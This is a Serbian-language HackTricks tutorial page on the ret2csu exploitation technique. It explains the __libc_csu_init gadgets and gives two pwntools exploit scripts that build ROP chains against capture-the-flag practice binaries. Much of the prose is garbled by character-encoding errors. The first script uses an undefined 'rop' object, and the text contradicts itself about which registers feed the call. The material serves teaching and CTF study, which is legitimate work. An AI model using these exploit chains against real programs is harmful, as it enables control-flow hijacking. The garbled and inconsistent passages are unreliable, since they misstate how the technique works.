# Ret2csu

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

**ret2csu** je hakovanje tehnika koja se koristi kada pokuÅ¡avate preuzeti kontrolu nad programom, ali ne moÅ¾ete pronaÄ‡i **gadgete** koje obiÄno koristite za manipulisanje ponaÅ¡anjem programa.&#x20;

Kada program koristi odreÄ‘ene biblioteke (poput libc), ima neke ugraÄ‘ene funkcije za upravljanje naÄinom na koji razliÄiti delovi programa komuniciraju meÄ‘usobno. MeÄ‘u ovim funkcijama postoje neke skrivene dragocenosti koje mogu delovati kao naÅ¡i nedostajuÄ‡i gadgeti, posebno jedna nazvana `__libc_csu_init`.

### ÄŒarobni Gadgeti u \_\_libc\_csu\_init

U **`__libc_csu_init`**, postoje dve sekvence instrukcija (gadgeti) koje treba istaÄ‡i:

1. Prva sekvencija nam omoguÄ‡ava postavljanje vrednosti u nekoliko registara (rbx, rbp, r12, r13, r14, r15). To su poput slotova gde moÅ¾emo Äuvati brojeve ili adrese koje Å¾elimo koristiti kasnije.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Ova sprava nam omoguÄ‡ava da kontroliÅ¡emo ove registre tako Å¡to Ä‡emo vrednosti sa steka prebaciti u njih.

2. Drugi niz koraka koristi vrednosti koje smo postavili da uradi nekoliko stvari:
* **Premesti odreÄ‘ene vrednosti u druge registre**, pripremajuÄ‡i ih za koriÅ¡Ä‡enje kao parametre u funkcijama.
* **IzvrÅ¡i poziv na lokaciju** odreÄ‘enu sabiranjem vrednosti u r15 i rbx, zatim mnoÅ¾enjem rbx sa 8.
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
2. MoÅ¾da ne znate nijednu adresu koju biste mogli tamo upisati i **potreban vam je `ret` instrukcija**. Imajte na umu da Ä‡e drugi gedÅ¾et takoÄ‘e **zavrÅ¡iti sa `ret`**, ali moraÄ‡ete ispuniti neke **uslove** kako biste doÅ¡li do njega:
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
Uslovi Ä‡e biti:

* `[r12 + rbx*8]` mora pokazivati na adresu na kojoj se nalazi pozivna funkcija (ako nemate ideju i nema PIE, moÅ¾ete jednostavno koristiti funkciju `_init`):
* Ako je \_init na adresi `0x400560`, koristite GEF da pretraÅ¾ite pokazivaÄ u memoriji koji pokazuje na nju i postavite `[r12 + rbx*8]` da bude adresa sa pokazivaÄem na \_init:
```bash
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gefâ¤  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
0x400e38 - 0x400e44  â†’   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
0x600e38 - 0x600e44  â†’   "\x60\x05\x40[...]"
```
* `rbp` Ğ¸ `rbx` Ğ¼Ğ¾Ñ€Ğ°Ñ˜Ñƒ Ğ¸Ğ¼Ğ°Ñ‚Ğ¸ Ğ¸ÑÑ‚Ñƒ Ğ²Ñ€ĞµĞ´Ğ½Ğ¾ÑÑ‚ Ğ´Ğ° Ğ±Ğ¸ ÑĞµ Ğ¸Ğ·Ğ±ĞµĞ³Ğ°Ğ¾ ÑĞºĞ¾Ğº
* ĞŸĞ¾ÑÑ‚Ğ¾Ñ˜Ğµ Ğ½ĞµĞºĞ¸ Ğ¿Ñ€Ğ¾Ğ¿ÑƒÑˆÑ‚ĞµĞ½Ğ¸ `pop` Ğ¸Ğ½ÑÑ‚Ñ€ÑƒĞºÑ†Ğ¸Ñ˜Ğµ ĞºĞ¾Ñ˜Ğµ Ñ‚Ñ€ĞµĞ±Ğ° ÑƒĞ·ĞµÑ‚Ğ¸ Ñƒ Ğ¾Ğ±Ğ·Ğ¸Ñ€

## ĞŸÑ€Ğ¸Ğ¼ĞµÑ€

### ĞšĞ¾Ñ€Ğ¸ÑˆÑ›ĞµÑšĞµ Ğ¿Ğ¾Ğ·Ğ¸Ğ²Ğ°

Ğ—Ğ°Ğ¼Ğ¸ÑĞ»Ğ¸Ñ‚Ğµ Ğ´Ğ° Ğ¶ĞµĞ»Ğ¸Ñ‚Ğµ Ğ´Ğ° Ğ½Ğ°Ğ¿Ñ€Ğ°Ğ²Ğ¸Ñ‚Ğµ ÑĞ¸ÑÑ‚ĞµĞ¼ÑĞºĞ¸ Ğ¿Ğ¾Ğ·Ğ¸Ğ² Ğ¸Ğ»Ğ¸ Ğ¿Ğ¾Ğ·Ğ²Ğ°Ñ‚Ğµ Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ˜Ñƒ ĞºĞ°Ğ¾ ÑˆÑ‚Ğ¾ Ñ˜Ğµ `write()`, Ğ°Ğ»Ğ¸ Ğ²Ğ°Ğ¼ Ñ‚Ñ€ĞµĞ±Ğ°Ñ˜Ñƒ ÑĞ¿ĞµÑ†Ğ¸Ñ„Ğ¸Ñ‡Ğ½Ğµ Ğ²Ñ€ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ Ñƒ Ñ€ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ¸Ğ¼Ğ° `rdx` Ğ¸ `rsi` ĞºĞ°Ğ¾ Ğ¿Ğ°Ñ€Ğ°Ğ¼ĞµÑ‚Ñ€Ğµ. ĞĞ±Ğ¸Ñ‡Ğ½Ğ¾ Ğ±Ğ¸ÑÑ‚Ğµ Ñ‚Ñ€Ğ°Ğ¶Ğ¸Ğ»Ğ¸ Ğ³Ğ°Ğ´Ğ¶ĞµÑ‚Ğµ ĞºĞ¾Ñ˜Ğ¸ Ğ¿Ğ¾ÑÑ‚Ğ°Ğ²Ñ™Ğ°Ñ˜Ñƒ Ğ¾Ğ²Ğµ Ñ€ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğµ Ğ´Ğ¸Ñ€ĞµĞºÑ‚Ğ½Ğ¾, Ğ°Ğ»Ğ¸ Ğ¸Ñ… Ğ½Ğµ Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ¿Ñ€Ğ¾Ğ½Ğ°Ñ›Ğ¸.

ĞĞ²Ğ´Ğµ Ğ½Ğ° ÑÑ†ĞµĞ½Ñƒ ÑÑ‚ÑƒĞ¿Ğ° **ret2csu**:

1. **ĞŸĞ¾ÑÑ‚Ğ°Ğ²Ñ™Ğ°ÑšĞµ Ñ€ĞµĞ³Ğ¸ÑÑ‚Ğ°Ñ€Ğ°**: ĞšĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğµ Ğ¿Ñ€Ğ²Ğ¸ Ğ¼Ğ°Ğ³Ğ¸Ñ‡Ğ½Ğ¸ Ğ³Ğ°Ğ´Ğ¶ĞµÑ‚ Ğ´Ğ° Ğ¸Ğ·Ğ±Ğ°Ñ†Ğ¸Ñ‚Ğµ Ğ²Ñ€ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ ÑĞ° ÑÑ‚ĞµĞºĞ° Ğ¸ Ñƒ `rbx`, `rbp`, `r12` (edi), `r13` (rsi), `r14` (rdx) Ğ¸ `r15`.
2. **ĞšĞ¾Ñ€Ğ¸ÑˆÑ›ĞµÑšĞµ Ğ´Ñ€ÑƒĞ³Ğ¾Ğ³ Ğ³Ğ°Ğ´Ğ¶ĞµÑ‚Ğ°**: Ğ¡Ğ° Ñ‚Ğ¸Ğ¼ Ğ¿Ğ¾ÑÑ‚Ğ°Ğ²Ñ™ĞµĞ½Ğ¸Ğ¼ Ñ€ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ¸Ğ¼Ğ°, ĞºĞ¾Ñ€Ğ¸ÑÑ‚Ğ¸Ñ‚Ğµ Ğ´Ñ€ÑƒĞ³Ğ¸ Ğ³Ğ°Ğ´Ğ¶ĞµÑ‚. ĞĞ²Ğ¾ Ğ²Ğ°Ğ¼ Ğ¾Ğ¼Ğ¾Ğ³ÑƒÑ›Ğ°Ğ²Ğ° Ğ´Ğ° Ğ¿Ñ€ĞµĞ¼ĞµÑÑ‚Ğ¸Ñ‚Ğµ Ğ¸Ğ·Ğ°Ğ±Ñ€Ğ°Ğ½Ğµ Ğ²Ñ€ĞµĞ´Ğ½Ğ¾ÑÑ‚Ğ¸ Ñƒ `rdx` Ğ¸ `rsi` (Ğ¸Ğ· r14 Ğ¸ r13, Ñ€ĞµÑĞ¿ĞµĞºÑ‚Ğ¸Ğ²Ğ½Ğ¾), ÑĞ¿Ñ€ĞµĞ¼Ğ°Ñ˜ÑƒÑ›Ğ¸ Ğ¿Ğ°Ñ€Ğ°Ğ¼ĞµÑ‚Ñ€Ğµ Ğ·Ğ° Ğ¿Ğ¾Ğ·Ğ¸Ğ² Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ˜Ğµ. Ğ¨Ñ‚Ğ°Ğ²Ğ¸ÑˆĞµ, ĞºĞ¾Ğ½Ñ‚Ñ€Ğ¾Ğ»Ğ¸ÑˆÑƒÑ›Ğ¸ `r15` Ğ¸ `rbx`, Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ½Ğ°Ğ²ĞµÑÑ‚Ğ¸ Ğ¿Ñ€Ğ¾Ğ³Ñ€Ğ°Ğ¼ Ğ´Ğ° Ğ¿Ğ¾Ğ·Ğ²Ğ° Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ˜Ñƒ ĞºĞ¾Ñ˜Ğ° ÑĞµ Ğ½Ğ°Ğ»Ğ°Ğ·Ğ¸ Ğ½Ğ° Ğ°Ğ´Ñ€ĞµÑĞ¸ ĞºĞ¾Ñ˜Ñƒ Ğ¸Ğ·Ñ€Ğ°Ñ‡ÑƒĞ½Ğ°Ğ²Ğ°Ñ‚Ğµ Ğ¸ ÑÑ‚Ğ°Ğ²Ñ™Ğ°Ñ‚Ğµ Ñƒ `[r15 + rbx*8]`.

Ğ˜Ğ¼Ğ°Ñ‚Ğµ [**Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ€ ĞºĞ¾Ñ€Ğ¸ÑˆÑ›ĞµÑšĞ° Ğ¾Ğ²Ğµ Ñ‚ĞµÑ…Ğ½Ğ¸ĞºĞµ Ğ¸ Ğ¾Ğ±Ñ˜Ğ°ÑˆÑšĞµÑšĞµ Ğ¾Ğ²Ğ´Ğµ**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), Ğ° Ğ¾Ğ²Ğ¾ Ñ˜Ğµ ĞºÑ€Ğ°Ñ˜ÑšĞ¸ ĞµĞºÑĞ¿Ğ»Ğ¾Ğ¸Ñ‚ ĞºĞ¾Ñ˜Ğ¸ Ñ˜Ğµ ĞºĞ¾Ñ€Ğ¸ÑˆÑ›ĞµĞ½:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Imajte na umu da prethodni exploit nije namenjen za **`RCE`**, veÄ‡ samo da pozove funkciju nazvanu **`win`** (uzimanje adrese `win` sa stdin pozivanjem gets u ROP lancu i smeÅ¡tanje u r15) sa treÄ‡im argumentom vrednosti `0xdeadbeefcafed00d`.
{% endhint %}

### Bypassing the call and reaching ret

SledeÄ‡i exploit je izvuÄen [**sa ove stranice**](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/ropemporium\_ret2csu/index.html) gde se koristi **ret2csu** ali umesto koriÅ¡Ä‡enja poziva, **zaobilazi poreÄ‘enja i stiÅ¾e do `ret`** nakon poziva:
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```
### ZaÅ¡to ne koristiti libc direktno?

ObiÄno su ovi sluÄajevi takoÄ‘e ranjivi na **ret2plt** + **ret2lib**, ali ponekad morate kontrolisati viÅ¡e parametara nego Å¡to je lako kontrolisati pomoÄ‡u gedÅ¾eta koje direktno pronaÄ‘ete u libc-u. Na primer, funkcija `write()` zahteva tri parametra, a **pronaÄ‡i gedÅ¾ete za postavljanje svih ovih direktno moÅ¾da nije moguÄ‡e**.
